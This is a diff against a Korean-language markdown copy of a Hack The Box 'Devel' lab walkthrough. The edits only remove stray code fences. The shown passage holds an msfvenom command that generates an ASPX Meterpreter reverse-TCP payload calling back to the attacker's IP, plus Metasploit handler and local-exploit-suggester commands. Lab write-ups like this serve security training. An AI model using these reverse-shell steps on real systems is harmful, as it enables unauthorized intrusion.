@@ -35,7 +35,7 @@ link: "https://medium.com/@jaylinscorner/devel-hack-the-box-walkthrough-6a04f5f0
 
 <div class="content-ad"></div>
 
-```
+
 <img src="/assets/img/2024-06-19-DevelHackTheBoxWalk-through_3.png" />
 
 랜덤 ASPX 파일을 업로드한 후 익명 사용자의 업로드 기능을 이용할 수 있다는 점을 알 수 있습니다.
@@ -43,7 +43,7 @@ link: "https://medium.com/@jaylinscorner/devel-hack-the-box-walkthrough-6a04f5f0
 ASPX 파일을 업로드할 수 있으므로 ASPX 역술을 생성해볼 수 있습니다.
 
 터미널에서 Metasploit Payload Generator를 엽니다.
-```
+
 
 <div class="content-ad"></div>
 
@@ -57,7 +57,7 @@ msfvenom
 msfvenom -f aspx -p windows/meterpreter/reverse_tcp LHOST=(내_IP) LPORT=4444 -o moe.aspx
 ```
 
-msfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드를 생성하려고 합니다. 이 경우 Windows reverse_tcp 페이로드를 사용하고 있으며, 이는 Windows 상자이기 때문입니다. 선택한 옵션은 Meterpreter입니다.```
+msfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드를 생성하려고 합니다. 이 경우 Windows reverse_tcp 페이로드를 사용하고 있으며, 이는 Windows 상자이기 때문입니다. 선택한 옵션은 Meterpreter입니다.
 
 <div class="content-ad"></div>
 
@@ -75,15 +75,15 @@ msfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드�
 
 <div class="content-ad"></div>
 
-```
+
 msfconsole
-```
+
 
 그런 다음 사용할 exploit으로 이동하겠습니다.
 
-```
+
 use exploit/multi/handler 
-```
+
 
 그런 다음 옵션을 우리가 원하는 대로 구성합니다.
 
@@ -93,7 +93,7 @@ use exploit/multi/handler
 
 <div class="content-ad"></div>
 
-```
+
 ```js
 set payload windows/meterpreter/reverse_tcp
 ```
@@ -105,7 +105,7 @@ set payload windows/meterpreter/reverse_tcp
 ```js
 run
 ```  
-```
+
 
 <div class="content-ad"></div>
 
@@ -142,7 +142,7 @@ use post/multi/recon/local_exploit_suggester
 이전에 메모한 세션 ID를 여기에 입력하겠습니다:
 
 ![Image 2](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_6.png)
-```
+
 
 <div class="content-ad"></div>
 
